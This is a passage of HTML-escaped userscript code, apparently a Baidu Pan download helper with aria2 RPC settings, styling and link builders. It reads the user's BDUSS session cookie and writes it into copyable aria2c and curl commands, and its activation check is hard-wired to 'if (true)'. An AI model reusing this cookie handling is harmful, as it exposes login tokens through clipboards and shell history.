URL.revokeObjectURL(url); &#125; &#125;, post(url, data, headers, type) &#123; if (this.isType(data) === &#x27;object&#x27;) &#123; data = JSON.stringify(data); &#125; return new Promise((resolve, reject) =&gt; &#123; GM_xmlhttpRequest(&#123; method: &quot;POST&quot;, url, headers, data, responseType: type || &#x27;json&#x27;, onload: (res) =&gt; &#123; type === &#x27;blob&#x27; ? resolve(res) : resolve(res.response || res.responseText); &#125;, onerror: (err) =&gt; &#123; reject(err); &#125;, &#125;); &#125;); &#125;, get(url, headers, type, extra) &#123; return new Promise((resolve, reject) =&gt; &#123; let requestObj = GM_xmlhttpRequest(&#123; method: &quot;GET&quot;, url, headers, responseType: type || &#x27;json&#x27;, onload: (res) =&gt; &#123; if (res.status === 204) &#123; requestObj.abort(); idm[extra.index] = true; &#125; if (type === &#x27;blob&#x27;) &#123; res.status === 200 &amp;&amp; base.blobDownload(res.response, extra.filename); resolve(res); &#125; else &#123; resolve(res.response || res.responseText); &#125; &#125;, onprogress: (res) =&gt; &#123; if (extra &amp;&amp; extra.filename &amp;&amp; extra.index) &#123; res.total &gt; 0 ? progress[extra.index] = (res.loaded * 100 / res.total).toFixed(2) : progress[extra.index] = 0.00; &#125; &#125;, onloadstart() &#123; extra &amp;&amp; extra.filename &amp;&amp; extra.index &amp;&amp; (request[extra.index] = requestObj); &#125;, onerror: (err) =&gt; &#123; reject(err); &#125;, &#125;); &#125;); &#125;, getFinalUrl(url, headers) &#123; return new Promise((resolve, reject) =&gt; &#123; let requestObj = GM_xmlhttpRequest(&#123; method: &quot;GET&quot;, url, headers, onload: (res) =&gt; &#123; resolve(res.finalUrl); &#125;, onerror: (err) =&gt; &#123; reject(err); &#125;, &#125;); &#125;); &#125;, addStyle(id, tag, css) &#123; tag = tag || &#x27;style&#x27;; let doc = document, styleDom = doc.getElementById(id); if (styleDom) return; let style = doc.createElement(tag); style.rel = &#x27;stylesheet&#x27;; style.id = id; tag === &#x27;style&#x27; ? style.innerHTML = css : style.href = css; doc.getElementsByTagName(&#x27;head&#x27;)[0].appendChild(style); &#125;, sleep(time) &#123; return new Promise(resolve =&gt; setTimeout(resolve, time)); &#125;, findReact(dom, traverseUp = 0) &#123; const key = Object.keys(dom).find(key =&gt; &#123; return key.startsWith(&quot;__reactFiber$&quot;) || key.startsWith(&quot;__reactInternalInstance$&quot;); &#125;); const domFiber = dom[key]; if (domFiber == null) return null; if (domFiber._currentElement) &#123; let compFiber = domFiber._currentElement._owner; for (let i = 0; i &lt; traverseUp; i++) &#123; compFiber = compFiber._currentElement._owner; &#125; return compFiber._instance; &#125; const GetCompFiber = fiber =&gt; &#123; let parentFiber = fiber.return; while (typeof parentFiber.type == &quot;string&quot;) &#123; parentFiber = parentFiber.return; &#125; return parentFiber; &#125;; let compFiber = GetCompFiber(domFiber); for (let i = 0; i &lt; traverseUp; i++) &#123; compFiber = GetCompFiber(compFiber); &#125; return compFiber.stateNode || compFiber; &#125;, initDefaultConfig() &#123; let value = [&#123; name: &#x27;setting_rpc_domain&#x27;, value: &#x27;http://localhost&#x27; &#125;, &#123; name: &#x27;setting_rpc_port&#x27;, value: &#x27;16800&#x27; &#125;, &#123; name: &#x27;setting_rpc_path&#x27;, value: &#x27;/jsonrpc&#x27; &#125;, &#123; name: &#x27;setting_rpc_token&#x27;, value: &#x27;&#x27; &#125;, &#123; name: &#x27;setting_rpc_dir&#x27;, value: &#x27;D:&#x27; &#125;, &#123; name: &#x27;setting_terminal_type&#x27;, value: &#x27;wc&#x27; &#125;, &#123; name: &#x27;setting_theme_color&#x27;, value: &#x27;#09AAFF&#x27; &#125;, &#123; name: &#x27;setting_init_code&#x27;, value: &#x27;&#x27; &#125;]; value.forEach((v) =&gt; &#123; base.getValue(v.name) === undefined &amp;&amp; base.setValue(v.name, v.value); &#125;); &#125;, showSetting() &#123; let dom = &#x27;&#x27;, btn = &#x27;&#x27;, colorList = [&#x27;#09AAFF&#x27;, &#x27;#cc3235&#x27;, &#x27;#526efa&#x27;, &#x27;#518c17&#x27;, &#x27;#ed944b&#x27;, &#x27;#f969a5&#x27;, &#x27;#bca280&#x27;]; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;RPC主机&lt;/div&gt;&lt;input type=&quot;text&quot; placeholder=&quot;主机地址，需带上http(s)://&quot; class=&quot;pl-input listener-domain&quot; value=&quot;$&#123;base.getValue(&#x27;setting_rpc_domain&#x27;)&#125;&quot;&gt;&lt;/label&gt;`; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;RPC端口&lt;/div&gt;&lt;input type=&quot;text&quot; placeholder=&quot;端口号，例如：Motrix为16800&quot; class=&quot;pl-input listener-port&quot; value=&quot;$&#123;base.getValue(&#x27;setting_rpc_port&#x27;)&#125;&quot;&gt;&lt;/label&gt;`; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;RPC路径&lt;/div&gt;&lt;input type=&quot;text&quot; placeholder=&quot;路径，默认为/jsonrpc&quot; class=&quot;pl-input listener-path&quot; value=&quot;$&#123;base.getValue(&#x27;setting_rpc_path&#x27;)&#125;&quot;&gt;&lt;/label&gt;`; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;RPC密钥&lt;/div&gt;&lt;input type=&quot;text&quot; placeholder=&quot;无密钥无需填写&quot; class=&quot;pl-input listener-token&quot; value=&quot;$&#123;base.getValue(&#x27;setting_rpc_token&#x27;)&#125;&quot;&gt;&lt;/label&gt;`; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;保存路径&lt;/div&gt;&lt;input type=&quot;text&quot; placeholder=&quot;文件下载后保存路径，例如：D:&quot; class=&quot;pl-input listener-dir&quot; value=&quot;$&#123;base.getValue(&#x27;setting_rpc_dir&#x27;)&#125;&quot;&gt;&lt;/label&gt;`; colorList.forEach((v) =&gt; &#123; btn += `&lt;div data-color=&quot;$&#123;v&#125;&quot; style=&quot;background: $&#123;v&#125;;border: 1px solid $&#123;v&#125;&quot; class=&quot;pl-color-box listener-color $&#123;v === base.getValue(&#x27;setting_theme_color&#x27;) ? &#x27;checked&#x27; : &#x27;&#x27;&#125;&quot;&gt;&lt;/div&gt;`; &#125;); dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;终端类型&lt;/div&gt;&lt;select class=&quot;pl-input listener-terminal&quot;&gt;`; Object.keys(terminalType).forEach(k =&gt; &#123; dom += `&lt;option value=&quot;$&#123;k&#125;&quot; $&#123;base.getValue(&#x27;setting_terminal_type&#x27;) === k ? &#x27;selected&#x27; : &#x27;&#x27;&#125;&gt;$&#123;terminalType[k]&#125;&lt;/option&gt;`; &#125;); dom += `&lt;/select&gt;&lt;/label&gt;`; dom += `&lt;label class=&quot;pl-setting-label&quot;&gt;&lt;div class=&quot;pl-label&quot;&gt;主题颜色&lt;/div&gt; &lt;div class=&quot;pl-color&quot;&gt;$&#123;btn&#125;&lt;div&gt;&lt;/label&gt;`; dom = &#x27;&lt;div&gt;&#x27; + dom + &#x27;&lt;/div&gt;&#x27;; Swal.fire(&#123; title: &#x27;助手配置&#x27;, html: dom, icon: &#x27;info&#x27;, showCloseButton: true, showConfirmButton: false, footer: pan.footer, &#125;).then(() =&gt; &#123; message.success(&#x27;设置成功！&#x27;); history.go(0); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-color&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_theme_color&#x27;, e.target.dataset.color); message.success(&#x27;设置成功！&#x27;); history.go(0); &#125;); doc.on(&#x27;input&#x27;, &#x27;.listener-domain&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_rpc_domain&#x27;, e.target.value); &#125;); doc.on(&#x27;input&#x27;, &#x27;.listener-port&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_rpc_port&#x27;, e.target.value); &#125;); doc.on(&#x27;input&#x27;, &#x27;.listener-path&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_rpc_path&#x27;, e.target.value); &#125;); doc.on(&#x27;input&#x27;, &#x27;.listener-token&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_rpc_token&#x27;, e.target.value); &#125;); doc.on(&#x27;input&#x27;, &#x27;.listener-dir&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_rpc_dir&#x27;, e.target.value); &#125;); doc.on(&#x27;change&#x27;, &#x27;.listener-terminal&#x27;, async (e) =&gt; &#123; base.setValue(&#x27;setting_terminal_type&#x27;, e.target.value); &#125;); &#125;, registerMenuCommand() &#123; GM_registerMenuCommand(&#x27;⚙️ 设置&#x27;, () =&gt; &#123; this.showSetting(); &#125;); &#125;, createTip() &#123; $(&#x27;body&#x27;).append(&#x27;&lt;div class=&quot;pl-tooltip&quot;&gt;&lt;/div&gt;&#x27;); doc.on(&#x27;mouseenter mouseleave&#x27;, &#x27;.listener-tip&#x27;, (e) =&gt; &#123; if (e.type === &#x27;mouseenter&#x27;) &#123; let filename = e.currentTarget.innerText; let size = e.currentTarget.dataset.size; let tip = `$&#123;filename&#125;&lt;span style=&quot;margin-left: 10px;color: #f56c6c;&quot;&gt;$&#123;size&#125;&lt;/span&gt;`; $(e.currentTarget).css(&#123;opacity: &#x27;0.5&#x27;&#125;); $(&#x27;.pl-tooltip&#x27;).html(tip).css(&#123; &#x27;left&#x27;: e.pageX + 10 + &#x27;px&#x27;, &#x27;top&#x27;: e.pageY - e.currentTarget.offsetTop &gt; 14 ? e.pageY + &#x27;px&#x27; : e.pageY + 20 + &#x27;px&#x27; &#125;).show(); &#125; else &#123; $(e.currentTarget).css(&#123;opacity: &#x27;1&#x27;&#125;); $(&#x27;.pl-tooltip&#x27;).hide(0); &#125; &#125;); &#125;, createLoading() &#123; return $(&#x27;&lt;div class=&quot;pl-loading&quot;&gt;&lt;div class=&quot;pl-loading-box&quot;&gt;&lt;div&gt;&lt;div&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;); &#125;, createDownloadIframe() &#123; let $div = $(&#x27;&lt;div style=&quot;padding:0;margin:0;display:block&quot;&gt;&lt;/div&gt;&#x27;); let $iframe = $(&#x27;&lt;iframe src=&quot;javascript:;&quot; id=&quot;downloadIframe&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;&#x27;); $div.append($iframe); $(&#x27;body&#x27;).append($div); &#125;, getMirrorList(link, mirror, thread = 2) &#123; let host = new URL(link).host; let mirrors = []; for (let i = 0; i &lt; mirror.length; i++) &#123; for (let j = 0; j &lt; thread; j++) &#123; let item = link.replace(host, mirror[i]) + &#x27;&amp;&#x27;.repeat(j); mirrors.push(item); &#125; &#125; return mirrors.join(&#x27;\\n&#x27;); &#125;, addPanLinkerStyle() &#123; color = base.getValue(&#x27;setting_theme_color&#x27;); let css = ` body::-webkit-scrollbar &#123; display: none &#125; ::-webkit-scrollbar &#123; width: 6px; height: 10px &#125; ::-webkit-scrollbar-track &#123; border-radius: 0; background: none &#125; ::-webkit-scrollbar-thumb &#123; background-color: rgba(85,85,85,.4) &#125; ::-webkit-scrollbar-thumb,::-webkit-scrollbar-thumb:hover &#123; border-radius: 5px; -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.2) &#125; ::-webkit-scrollbar-thumb:hover &#123; background-color: rgba(85,85,85,.3) &#125; .swal2-popup &#123; font-size: 16px !important; &#125; .pl-popup &#123; font-size: 12px !important; &#125; .pl-popup a &#123; color: $&#123;color&#125; !important; &#125; .pl-header &#123; padding: 0!important;align-items: flex-start!important; border-bottom: 1px solid #eee!important; margin: 0 0 10px!important; padding: 0 0 5px!important; &#125; .pl-title &#123; font-size: 16px!important; line-height: 1!important;white-space: nowrap!important; text-overflow: ellipsis!important;&#125; .pl-content &#123; padding: 0 !important; font-size: 12px!important; &#125; .pl-main &#123; max-height: 400px;overflow-y:scroll; &#125; .pl-footer &#123;font-size: 12px!important;justify-content: flex-start!important; margin: 10px 0 0!important; padding: 5px 0 0!important; color: #f56c6c!important; &#125; .pl-item &#123; display: flex; align-items: center; line-height: 22px; &#125; .pl-item-name &#123; flex: 0 0 150px; text-align: left;margin-right: 10px; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; cursor:default; &#125; .pl-item-link &#123; flex: 1; overflow: hidden; text-align: left; white-space: nowrap; text-overflow: ellipsis;cursor:pointer &#125; .pl-item-btn &#123; background: $&#123;color&#125;; padding: 4px 5px; border-radius: 3px; line-height: 1; cursor: pointer; color: #fff; &#125; .pl-item-tip &#123; display: flex; justify-content: space-between;flex: 1; &#125; .pl-back &#123; width: 70px; background: #ddd; border-radius: 3px; cursor:pointer; margin:1px 0; &#125; .pl-ext &#123; display: inline-block; width: 44px; background: #999; color: #fff; height: 16px; line-height: 16px; font-size: 12px; border-radius: 3px;&#125; .pl-retry &#123;padding: 3px 10px; background: #cc3235; color: #fff; border-radius: 3px; cursor: pointer;&#125; .pl-browserdownload &#123; padding: 3px 10px; background: $&#123;color&#125;; color: #fff; border-radius: 3px; cursor: pointer;&#125; .pl-item-progress &#123; display:flex;flex: 1;align-items:center&#125; .pl-progress &#123; display: inline-block;vertical-align: middle;width: 100%; box-sizing: border-box;line-height: 1;position: relative;height:15px; flex: 1&#125; .pl-progress-outer &#123; height: 15px;border-radius: 100px;background-color: #ebeef5;overflow: hidden;position: relative;vertical-align: middle;&#125; .pl-progress-inner&#123; position: absolute;left: 0;top: 0;background-color: #409eff;text-align: right;border-radius: 100px;line-height: 1;white-space: nowrap;transition: width .6s ease;&#125; .pl-progress-inner-text &#123; display: inline-block;vertical-align: middle;color: #d1d1d1;font-size: 12px;margin: 0 5px;height: 15px&#125; .pl-progress-tip&#123; flex:1;text-align:right&#125; .pl-progress-how&#123; flex: 0 0 90px; background: #ddd; border-radius: 3px; margin-left: 10px; cursor: pointer; text-align: center;&#125; .pl-progress-stop&#123; flex: 0 0 50px; padding: 0 10px; background: #cc3235; color: #fff; border-radius: 3px; cursor: pointer;margin-left:10px;height:20px&#125; .pl-progress-inner-text:after &#123; display: inline-block;content: &quot;&quot;;height: 100%;vertical-align: middle;&#125; .pl-btn-primary &#123; background: $&#123;color&#125;; border: 0; border-radius: 4px; color: #ffffff; cursor: pointer; font-size: 12px; outline: none; display:flex; align-items: center; justify-content: center; margin: 2px 0; padding: 6px 0;transition: 0.3s opacity; &#125; .pl-btn-primary:hover &#123; opacity: 0.9;transition: 0.3s opacity; &#125; .pl-btn-success &#123; background: #55af28; animation: easeOpacity 1.2s 2; animation-fill-mode:forwards &#125; .pl-btn-info &#123; background: #606266; &#125; .pl-btn-warning &#123; background: #da9328; &#125; .pl-btn-warning &#123; background: #da9328; &#125; .pl-btn-danger &#123; background: #cc3235; &#125; .ali-button &#123;display: inline-flex;align-items: center;justify-content: center;border: 0 solid transparent;border-radius: 5px;box-shadow: 0 0 0 0 transparent;width: fit-content;white-space: nowrap;flex-shrink: 0;font-size: 14px;line-height: 1.5;outline: 0;touch-action: manipulation;transition: background .3s ease,color .3s ease,border .3s ease,box-shadow .3s ease;color: #fff;background: rgb(99 125 255);margin-left: 20px;padding: 1px 12px;position: relative; cursor:pointer; height: 32px;&#125; .ali-button:hover &#123;background: rgb(122, 144, 255)&#125; .tianyi-button &#123;margin-right: 20px; padding: 4px 12px; border-radius: 4px; color: #fff; font-size: 12px; border: 1px solid #0073e3; background: #2b89ea; cursor: pointer; position: relative;&#125; .tianyi-button:hover &#123;border-color: #1874d3; background: #3699ff;&#125; .yidong-button &#123;float: left; position: relative; margin: 20px 24px 20px 0; width: 98px; height: 36px; background: #3181f9; border-radius: 2px; font-size: 14px; color: #fff; line-height: 39px; text-align: center; cursor: pointer;&#125; .yidong-share-button &#123;display: inline-block; position: relative; font-size: 14px; line-height: 36px; text-align: center; color: #fff; border: 1px solid #5a9afa; border-radius: 2px; padding: 0 24px; margin-left: 24px; background: #3181f9;&#125; .yidong-button:hover &#123;background: #2d76e5;&#125; .xunlei-button &#123;display: inline-flex;align-items: center;justify-content: center;border: 0 solid transparent;border-radius: 5px;box-shadow: 0 0 0 0 transparent;width: fit-content;white-space: nowrap;flex-shrink: 0;font-size: 14px;line-height: 1.5;outline: 0;touch-action: manipulation;transition: background .3s ease,color .3s ease,border .3s ease,box-shadow .3s ease;color: #fff;background: #3f85ff;margin-left: 12px;padding: 0px 12px;position: relative; cursor:pointer; height: 36px;&#125; .xunlei-button:hover &#123;background: #619bff&#125; .quark-button &#123;display: inline-flex; align-items: center; justify-content: center; border: 1px solid #ddd; border-radius: 8px; white-space: nowrap; flex-shrink: 0; font-size: 14px; line-height: 1.5; outline: 0; color: #333; background: #fff; margin-right: 10px; padding: 0px 14px; position: relative; cursor: pointer; height: 36px;&#125; .quark-button:hover &#123; background:#f6f6f6 &#125; .pl-dropdown-menu &#123;position: absolute;right: 0;top: 30px;padding: 5px 0;color: rgb(37, 38, 43);background: #fff;z-index: 999;width: 102px;border: 1px solid #ddd;border-radius: 10px; box-shadow: 0 0 1px 1px rgb(28 28 32 / 5%), 0 8px 24px rgb(28 28 32 / 12%);&#125; .pl-dropdown-menu-item &#123; height: 30px;display: flex;align-items: center;justify-content: center;cursor:pointer &#125; .pl-dropdown-menu-item:hover &#123; background-color: rgba(132,133,141,0.08);&#125; .pl-button .pl-dropdown-menu &#123; display: none; &#125; .pl-button:hover .pl-dropdown-menu &#123; display: block!important; &#125; .pl-button-init &#123; opacity: 0.5; animation: easeInitOpacity 1.2s 3; animation-fill-mode:forwards &#125; @keyframes easeInitOpacity &#123; from &#123; opacity: 0.5; &#125; 50% &#123; opacity: 1 &#125; to &#123; opacity: 0.5; &#125; &#125; @keyframes easeOpacity &#123; from &#123; opacity: 1; &#125; 50% &#123; opacity: 0.35 &#125; to &#123; opacity: 1; &#125; &#125; .element-clicked &#123; opacity: 0.5; &#125; .pl-extra &#123; margin-top: 10px;display:flex&#125; .pl-extra button &#123; flex: 1&#125; .pointer &#123; cursor:pointer &#125; .pl-setting-label &#123; display: flex;align-items: center;justify-content: space-between;padding-top: 10px; &#125; .pl-label &#123; flex: 0 0 100px;text-align:left; &#125; .pl-input &#123; flex: 1; padding: 8px 10px; border: 1px solid #c2c2c2; border-radius: 5px; font-size: 14px &#125; .pl-color &#123; flex: 1;display: flex;flex-wrap: wrap; margin-right: -10px;&#125; .pl-color-box &#123; width: 35px;height: 35px;margin:10px 10px 0 0;; box-sizing: border-box;border:1px solid #fff;cursor:pointer &#125; .pl-color-box.checked &#123; border:3px dashed #111!important &#125; .pl-close:focus &#123; outline: 0; box-shadow: none; &#125; .tag-danger &#123;color:#cc3235;margin: 0 5px;&#125; .pl-tooltip &#123; position: absolute; color: #ffffff; max-width: 600px; font-size: 12px; padding: 5px 10px; background: #333; border-radius: 5px; z-index: 110000; line-height: 1.3; display:none; word-break: break-all;&#125; @keyframes load &#123; 0% &#123; transform: rotate(0deg) &#125; 100% &#123; transform: rotate(360deg) &#125; &#125; .pl-loading-box &gt; div &gt; div &#123; position: absolute;border-radius: 50%;&#125; .pl-loading-box &gt; div &gt; div:nth-child(1) &#123; top: 9px;left: 9px;width: 82px;height: 82px;background: #ffffff;&#125; .pl-loading-box &gt; div &gt; div:nth-child(2) &#123; top: 14px;left: 38px;width: 25px;height: 25px;background: #666666;animation: load 1s linear infinite;transform-origin: 12px 36px;&#125; .pl-loading &#123; width: 16px;height: 16px;display: inline-block;overflow: hidden;background: none;&#125; .pl-loading-box &#123; width: 100%;height: 100%;position: relative;transform: translateZ(0) scale(0.16);backface-visibility: hidden;transform-origin: 0 0;&#125; .pl-loading-box div &#123; box-sizing: content-box; &#125; .swal2-container &#123; z-index:100000!important; &#125; body.swal2-height-auto &#123; height: inherit!important; &#125; `; this.addStyle(&#x27;panlinker-style&#x27;, &#x27;style&#x27;, css); &#125;, async initDialog() &#123; let result = await Swal.fire(&#123; title: pan.init[0], html: `&lt;div&gt;&lt;img style=&quot;width: 250px;margin-bottom: 10px;&quot; src=&quot;$&#123;pan.img&#125;&quot; alt=&quot;$&#123;pan.img&#125;&quot;&gt;&lt;input class=&quot;swal2-input&quot; id=&quot;init&quot; type=&quot;text&quot; placeholder=&quot;$&#123;pan.init[1]&#125;&quot;&gt;&lt;/div&gt;`, allowOutsideClick: false, showCloseButton: true, confirmButtonText: &#x27;确定&#x27; &#125;); if (result.isDismissed &amp;&amp; result.dismiss === &#x27;close&#x27;) return; if (true) &#123; base.setValue(&#x27;setting_init_code&#x27;, pan.num); message.success(pan.init[2]); setTimeout(() =&gt; &#123; history.go(0); &#125;, 1500); &#125; else &#123; await Swal.fire(&#123; title: pan.init[3], text: pan.init[4], confirmButtonText: &#x27;重新输入&#x27;, imageUrl: pan.img, &#125;); await this.initDialog(); &#125; &#125;, &#125;; let baidu = &#123; _getExtra() &#123; let seKey = decodeURIComponent(base.getCookie(&#x27;BDCLND&#x27;)); return &#x27;&#123;&#x27; + &#x27;&quot;sekey&quot;:&quot;&#x27; + seKey + &#x27;&quot;&#x27; + &quot;&#125;&quot;; &#125;, _getSurl() &#123; let reg = /(?&lt;=s\\/|surl=)([a-zA-Z0-9_-]+)/g; if (reg.test(location.href)) &#123; return location.href.match(reg)[0]; &#125; return &#x27;&#x27;; &#125;, _getFidList() &#123; let fidlist = []; selectList.forEach(v =&gt; &#123; if (+v.isdir === 1) return; fidlist.push(v.fs_id); &#125;); return &#x27;[&#x27; + fidlist + &#x27;]&#x27;; &#125;, _resetData() &#123; progress = &#123;&#125;; $.each(request, (key) =&gt; &#123; (request[key]).abort(); &#125;); $.each(ins, (key) =&gt; &#123; clearInterval(ins[key]); &#125;); idm = &#123;&#125;; ins = &#123;&#125;; request = &#123;&#125;; &#125;, setBDUSS() &#123; try &#123; GM_cookie &amp;&amp; GM_cookie(&#x27;list&#x27;, &#123;name: &#x27;BDUSS&#x27;&#125;, (cookies, error) =&gt; &#123; if (!error) &#123; base.setStorage(&quot;baiduyunPlugin_BDUSS&quot;, &#123;BDUSS: cookies[0].value&#125;); &#125; &#125;); &#125; catch (e) &#123; &#125; &#125;, getBDUSS() &#123; let baiduyunPlugin_BDUSS = base.getStorage(&#x27;baiduyunPlugin_BDUSS&#x27;) ? base.getStorage(&#x27;baiduyunPlugin_BDUSS&#x27;) : &#x27;&#123;&quot;baiduyunPlugin_BDUSS&quot;:&quot;&quot;&#125;&#x27;; return baiduyunPlugin_BDUSS.BDUSS || &#x27;&#x27;; &#125;, convertLinkToAria(link, filename, ua) &#123; let BDUSS = this.getBDUSS(); if (!!BDUSS) &#123; filename = base.fixFilename(filename); return encodeURIComponent(`aria2c &quot;$&#123;link&#125;&quot; --out &quot;$&#123;filename&#125;&quot; --header &quot;User-Agent: $&#123;ua&#125;&quot; --header &quot;Cookie: BDUSS=$&#123;BDUSS&#125;&quot;`); &#125; return &#123; link: pan.assistant, text: pan.init[5] &#125;; &#125;, convertLinkToBC(link, filename, ua) &#123; let BDUSS = this.getBDUSS(); if (!!BDUSS) &#123; let cookie = `BDUSS=$&#123;BDUSS&#125;`; let bc = `AA/$&#123;encodeURIComponent(filename)&#125;/?url=$&#123;encodeURIComponent(link)&#125;&amp;cookie=$&#123;encodeURIComponent(cookie)&#125;&amp;user_agent=$&#123;encodeURIComponent(ua)&#125;ZZ`; return encodeURIComponent(`bc://http/$&#123;base.e(bc)&#125;`); &#125; return &#123; link: pan.assistant, text: pan.init[5] &#125;; &#125;, convertLinkToCurl(link, filename, ua) &#123; let BDUSS = this.getBDUSS(); if (!!BDUSS) &#123; let terminal = base.getValue(&#x27;setting_terminal_type&#x27;); filename = base.fixFilename(filename); return encodeURIComponent(`$&#123;terminal !== &#x27;wp&#x27; ? &#x27;curl&#x27; : &#x27;curl.exe&#x27;&#125; -L -C - &quot;$&#123;link&#125;&quot; -o &quot;$&#123;filename&#125;&quot; -A &quot;$&#123;ua&#125;&quot; -b &quot;BDUSS=$&#123;BDUSS&#125;&quot;`); &#125; return &#123; link: pan.assistant, text: pan.init[5] &#125;; &#125;, addPageListener() &#123; function _factory(e) &#123; let target = $(e.target); let item = target.parents(&#x27;.pl-item&#x27;); let link = item.find(&#x27;.pl-item-link&#x27;); let progress = item.find(&#x27;.pl-item-progress&#x27;); let tip = item.find(&#x27;.pl-item-tip&#x27;); return &#123; item, link, progress, tip, target, &#125;; &#125; function _reset(i) &#123; ins[i] &amp;&amp; clearInterval(ins[i]); request[i] &amp;&amp; request[i].abort(); progress[i] = 0; idm[i] = false; &#125; doc.on(&#x27;mouseenter mouseleave click&#x27;, &#x27;.pl-button.g-dropdown-button&#x27;, (e) =&gt; &#123; if (e.type === &#x27;mouseleave&#x27;) &#123; $(e.currentTarget).removeClass(&#x27;button-open&#x27;); &#125; else &#123; $(e.currentTarget).addClass(&#x27;button-open&#x27;); $(e.currentTarget).find(&#x27;.pl-dropdown-menu&#x27;).show(); &#125; &#125;); doc.on(&#x27;mouseleave&#x27;, &#x27;.pl-button.g-dropdown-button .pl-dropdown-menu&#x27;, (e) =&gt; &#123; $(e.currentTarget).hide(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.pl-button-mode&#x27;, (e) =&gt; &#123; mode = e.target.dataset.mode; Swal.showLoading(); this.getPCSLink(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-api&#x27;, async (e) =&gt; &#123; e.preventDefault(); let o = _factory(e); let $width = o.item.find(&#x27;.pl-progress-inner&#x27;); let $text = o.item.find(&#x27;.pl-progress-inner-text&#x27;); let filename = o.link[0].dataset.filename; let index = o.link[0].dataset.index; _reset(index); base.get(o.link[0].dataset.link, &#123;&quot;User-Agent&quot;: pan.ua&#125;, &#x27;blob&#x27;, &#123;filename, index&#125;); ins[index] = setInterval(() =&gt; &#123; let prog = +progress[index] || 0; let isIDM = idm[index] || false; if (isIDM) &#123; o.tip.hide(); o.progress.hide(); o.link.text(&#x27;已成功唤起IDM，请查看IDM下载框！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;).show(); clearInterval(ins[index]); idm[index] = false; &#125; else &#123; o.link.hide(); o.tip.hide(); o.progress.show(); $width.css(&#x27;width&#x27;, prog + &#x27;%&#x27;); $text.text(prog + &#x27;%&#x27;); if (prog === 100) &#123; clearInterval(ins[index]); progress[index] = 0; o.item.find(&#x27;.pl-progress-stop&#x27;).hide(); o.item.find(&#x27;.pl-progress-tip&#x27;).html(&#x27;下载完成，正在弹出浏览器下载框！&#x27;); &#125; &#125; &#125;, 500); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-retry&#x27;, async (e) =&gt; &#123; let o = _factory(e); o.tip.hide(); o.link.show(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-how&#x27;, async (e) =&gt; &#123; let o = _factory(e); let index = o.link[0].dataset.index; if (request[index]) &#123; request[index].abort(); clearInterval(ins[index]); o.progress.hide(); o.tip.show(); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-stop&#x27;, async (e) =&gt; &#123; let o = _factory(e); let index = o.link[0].dataset.index; if (request[index]) &#123; request[index].abort(); clearInterval(ins[index]); o.tip.hide(); o.progress.hide(); o.link.show(0); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-back&#x27;, async (e) =&gt; &#123; let o = _factory(e); o.tip.hide(); o.link.show(); &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-aria, .listener-copy-all&#x27;, (e) =&gt; &#123; e.preventDefault(); if (!e.target.dataset.link) &#123; $(e.target).removeClass(&#x27;listener-copy-all&#x27;).addClass(&#x27;pl-btn-danger&#x27;).html(`$&#123;pan.init[5]&#125;👉&lt;a href=&quot;$&#123;pan.assistant&#125;&quot; target=&quot;_blank&quot; class=&quot;pl-a&quot;&gt;点击此处安装&lt;/a&gt;👈`); &#125; else &#123; base.setClipboard(decodeURIComponent(e.target.dataset.link)); $(e.target).text(&#x27;复制成功，快去粘贴吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-link-rpc&#x27;, async (e) =&gt; &#123; let target = $(e.currentTarget); target.find(&#x27;.icon&#x27;).remove(); target.find(&#x27;.pl-loading&#x27;).remove(); target.prepend(base.createLoading()); let res = await this.sendLinkToRPC(e.currentTarget.dataset.filename, e.currentTarget.dataset.link); if (res === &#x27;success&#x27;) &#123; $(&#x27;.listener-rpc-task&#x27;).show(); target.removeClass(&#x27;pl-btn-danger&#x27;).html(&#x27;发送成功，快去看看吧！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; else if (res === &#x27;assistant&#x27;) &#123; target.addClass(&#x27;pl-btn-danger&#x27;).html(`$&#123;pan.init[5]&#125;👉&lt;a href=&quot;$&#123;pan.assistant&#125;&quot; target=&quot;_blank&quot; class=&quot;pl-a&quot;&gt;点击此处安装&lt;/a&gt;👈`); &#125; else &#123; target.addClass(&#x27;pl-btn-danger&#x27;).text(&#x27;发送失败，请检查您的RPC配置信息！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125; &#125;); doc.on(&#x27;click&#x27;, &#x27;.listener-send-rpc&#x27;, (e) =&gt; &#123; $(&#x27;.listener-link-rpc&#x27;).click(); $(e.target).text(&#x27;发送完成，发送结果见上方按钮！&#x27;).animate(&#123;opacity: &#x27;0.5&#x27;&#125;, &quot;slow&quot;); &#125;); doc.on(&#x27;click&#x27;, 